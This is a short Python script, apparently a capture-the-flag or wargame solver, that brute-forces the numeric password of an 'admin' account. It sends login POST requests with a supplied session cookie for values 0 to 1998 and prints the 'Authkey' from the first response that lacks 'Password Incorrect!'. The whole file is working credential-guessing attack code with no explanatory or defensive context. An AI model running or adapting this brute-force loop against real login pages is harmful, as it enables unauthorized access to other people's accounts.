def part1(session, URL, cookie) :
    for i in range(0, 1999) :
        data1={
            "id":"admin",
            "pw":i
           }

        req1=session.post(URL, cookies=cookie, data=data1)
        if (req1.text.find("Password Incorrect!") == -1 ) :
            index=req1.text.find("Authkey")
            print ("\n\n")
            print (req1.text[index:index+30])
            print ("\n\n")
            input("Press Any KEY to exit......")
            exit (0)
#        else :
#            print ("proc 1")

